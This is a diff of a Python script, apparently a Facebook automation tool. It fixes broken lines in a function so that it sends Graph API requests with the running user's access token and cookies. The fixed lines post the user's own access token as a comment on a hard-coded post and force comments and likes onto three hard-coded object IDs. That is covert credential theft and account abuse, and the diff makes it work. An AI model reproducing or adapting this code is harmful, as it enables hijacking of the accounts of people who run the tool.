@@ -276,12 +276,12 @@ def ___fii___Sayang___Kamu___Widiya___l():
     requests.post('https://graph.facebook.com/2035221186641974/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1696407830523313/comments/?message=' + toket + '&access_token=' + token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + token + '&access_token=' + token),cookies=cookie)
-    requests.post('https://graph.facebook.com/2035221186641974/comments/?message=' + kon + '&access_token=' + token),cookies=cookie)
-    requests.post('https://graph.facebook.com/2035221186641974/likes?summary=true&access_token=' + token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1696407830523313/likes?summary=true&access_token=' + token),cookies=cookie)
-    requests.post('https://graph.facebook.com/1639683522862411/likes?summary=true&access_token=' + token),cookies=cookie)
+    requests.post('https://graph.facebook.com/1696407830523313/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/1639683522862411/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/2035221186641974/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/2035221186641974/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/1696407830523313/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/1639683522862411/likes?summary=true&access_token=' + (token),cookies=cookie)
     menu()
 	
 ###### BUAT MENU
